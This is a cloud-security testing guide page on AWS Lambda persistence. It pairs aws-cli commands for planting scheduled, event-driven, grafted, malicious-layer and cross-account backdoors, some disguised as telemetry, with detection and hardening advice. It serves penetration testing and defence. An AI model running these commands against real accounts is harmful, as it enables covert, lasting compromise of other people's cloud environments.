---
cstg_id: CSTG-AWS-LAMBDA-PERSIST
title: "AWS Lambda - Persistence"
provider: aws
service: lambda
phase: persistence
required_access: assumed-breach
required_permissions:
  - lambda:CreateFunction
  - lambda:UpdateFunctionCode
  - lambda:UpdateFunctionConfiguration
  - lambda:AddPermission
  - lambda:CreateEventSourceMapping
  - lambda:PublishLayerVersion
  - lambda:AddLayerVersionPermission
  - events:PutRule
  - events:PutTargets
  - iam:PassRole
tools: [aws-cli, pacu, cloudfox]
references:
  - "https://docs.aws.amazon.com/lambda/latest/dg/invocation-eventsourcemapping.html"
  - "https://docs.aws.amazon.com/lambda/latest/dg/services-cloudwatchevents.html"
  - "https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html"
  - "https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/"
license: CC BY-SA 4.0
---

## Summary

Lambda is a durable persistence surface because functions can run code on a schedule or in response
to events, hold long-lived backdoor logic, and execute under a privileged role - all without keeping
an interactive session. An operator who can create or modify functions, attach triggers, or
influence layers can establish a foothold that survives credential rotation and re-fires
automatically. Common mechanisms are a scheduled backdoor function (EventBridge cron), a trigger that
fires on account activity (CloudTrail/EventBridge, S3, DynamoDB streams), a malicious layer or code
shim grafted into a legitimate function, and resource-policy grants that allow an external account to
invoke. This page covers establishing and detecting such persistence; it assumes a principal with
Lambda write permissions and `iam:PassRole` for a suitable role.

## Prerequisites

A principal able to create/modify functions and attach triggers, plus `iam:PassRole` for a role whose
trust policy allows `lambda.amazonaws.com`. Persistence value scales with the role's privileges, so a
backdoor wired to an administrative role is the high-impact case.

## Enumeration

Identify roles a backdoor can assume and existing triggers to blend into:

```bash
aws sts get-caller-identity
aws iam list-roles --query "Roles[?contains(to_string(AssumeRolePolicyDocument),'lambda.amazonaws.com')].Arn"
aws events list-rules --query 'Rules[].{Name:Name,Sched:ScheduleExpression}'   # existing schedules
aws lambda list-functions --query 'Functions[].FunctionName'                    # functions to graft into
```

## Misconfigurations & Findings

- Principals able to `CreateFunction` + `PassRole` on a privileged role, enabling a self-firing
  backdoor under high privilege.
- `lambda:AddPermission` / `AddLayerVersionPermission` grantable to external accounts, allowing
  cross-account invoke or a shared malicious layer.
- EventBridge `PutRule`/`PutTargets` available, enabling scheduled or event-driven triggers without
  touching the function itself.
- Legitimate functions whose code or layers can be modified without code-signing enforcement, ideal
  for a low-visibility graft.
- No drift detection on Lambda configuration, so injected layers, new triggers, and code changes go
  unnoticed.

## Exploitation

### Scheduled backdoor function (EventBridge cron)

Create a function under a privileged role and a recurring EventBridge rule that invokes it, e.g. to
re-create access keys or re-attach a policy if the operator's access is revoked.

```bash
aws lambda create-function --function-name aws-metrics-collector \
  --runtime python3.12 --handler index.handler \
  --role arn:aws:iam::<acct>:role/<privileged-role> --zip-file fileb://backdoor.zip

aws events put-rule --name aws-metrics-sync --schedule-expression 'rate(1 hour)'
aws events put-targets --rule aws-metrics-sync \
  --targets "Id=1,Arn=arn:aws:lambda:<region>:<acct>:function:aws-metrics-collector"
aws lambda add-permission --function-name aws-metrics-collector \
  --statement-id evb --action lambda:InvokeFunction \
  --principal events.amazonaws.com \
  --source-arn arn:aws:events:<region>:<acct>:rule/aws-metrics-sync
```

Naming the function and rule to resemble routine telemetry reduces the chance of review. The function
body can re-provision an IAM user/access key, re-add a trust relationship, or beacon out on each run.

### Event-driven trigger (fires on account activity)

Bind the backdoor to organic events so it runs only when the environment is active and blends with
normal traffic: an S3 `ObjectCreated` notification, a DynamoDB/Kinesis stream event source mapping, or
an EventBridge rule matching specific API calls (e.g. console logins, role assumptions).

```bash
aws lambda create-event-source-mapping --function-name aws-metrics-collector \
  --event-source-arn arn:aws:dynamodb:<region>:<acct>:table/<table>/stream/<ts> \
  --starting-position LATEST
```

### Graft into a legitimate, frequently-invoked function

Modify an existing high-traffic function's code or configuration so the backdoor rides along with
normal execution - far quieter than a new function. The added logic runs each time the legitimate
function is invoked.

```bash
aws lambda update-function-code --function-name <legit-fn> --zip-file fileb://patched.zip
```

### Malicious layer (low-visibility code injection)

Attach an attacker-published layer to one or more functions; layer code executes in each function's
context and survives function code redeployments that do not also change the layer list. A layer can
also be shared cross-account for broader, harder-to-spot persistence.

```bash
aws lambda publish-layer-version --layer-name common-utils \
  --zip-file fileb://layer.zip --compatible-runtimes python3.12
aws lambda update-function-configuration --function-name <legit-fn> \
  --layers arn:aws:lambda:<region>:<acct>:layer:common-utils:1
# Optional cross-account / external sharing of the layer:
aws lambda add-layer-version-permission --layer-name common-utils --version-number 1 \
  --statement-id share --action lambda:GetLayerVersion --principal <external-acct>
```

### Cross-account invoke grant (resource policy)

Add a resource-policy statement allowing an external account to invoke a privileged function, giving
the operator a re-entry path that does not depend on any in-account principal.

```bash
aws lambda add-permission --function-name <privileged-fn> \
  --statement-id ext --action lambda:InvokeFunction --principal <attacker-acct>
```

## Detection & Logging

`CreateFunction`, `UpdateFunctionCode`, `UpdateFunctionConfiguration`, `AddPermission`,
`AddLayerVersionPermission`, `PublishLayerVersion`, `CreateEventSourceMapping`, and EventBridge
`PutRule`/`PutTargets` are CloudTrail **management events**. Detection focuses on:

- New functions or event source mappings, especially paired with `PassRole` on a privileged role.
- New EventBridge rules targeting Lambda, or schedule expressions on rules tied to sensitive functions.
- `AddPermission`/`AddLayerVersionPermission` granting an external account principal.
- `UpdateFunctionConfiguration` that adds a layer, or `UpdateFunctionCode` on functions that rarely
  change - diff against a known-good baseline / IaC.
- The backdoor's downstream effects: the execution role performing IAM changes (new users/keys, policy
  attachments) or beaconing, surfaced by GuardDuty role-usage anomalies.

Function invocations of the backdoor are `Invoke` data events, logged only when Lambda data events are
enabled - schedule-driven persistence may otherwise leave only the management-event footprint of its
creation.

## Remediation & Hardening

- Constrain `iam:PassRole` to specific role ARNs with an `iam:PassedToService` condition; deny
  PassRole-to-Lambda on privileged roles outside change control.
- Restrict `lambda:AddPermission`, `AddLayerVersionPermission`, `CreateEventSourceMapping`, and
  EventBridge `PutRule`/`PutTargets` to a controlled deployment role; deny broadly via SCP.
- Enforce **Lambda code signing** so only approved, signed packages and layers can be deployed.
- Manage functions, triggers, and layers as code; run drift detection and alert on out-of-band
  `CreateFunction`/`Update*`/`AddPermission`/`PutRule` events.
- Periodically audit resource policies and layer-version permissions for external-account principals
  (IAM Access Analyzer).
- Enable Lambda data events and review EventBridge rules and event source mappings on a schedule.

## Tools

- **aws-cli** - establish and verify each persistence mechanism.
- **Pacu** - `lambda__*` modules automate backdoor function creation and trigger wiring
  (active/intrusive - requires explicit rules of engagement).
- **CloudFox** - inventories functions, triggers, layers, and resource policies to find planted or
  externally-shared persistence.

## References

- AWS - Lambda event source mappings
- AWS - Using Lambda with EventBridge (scheduled and event-driven invocation)
- AWS - Lambda layers
- hackingthe.cloud - Lambda persistence techniques
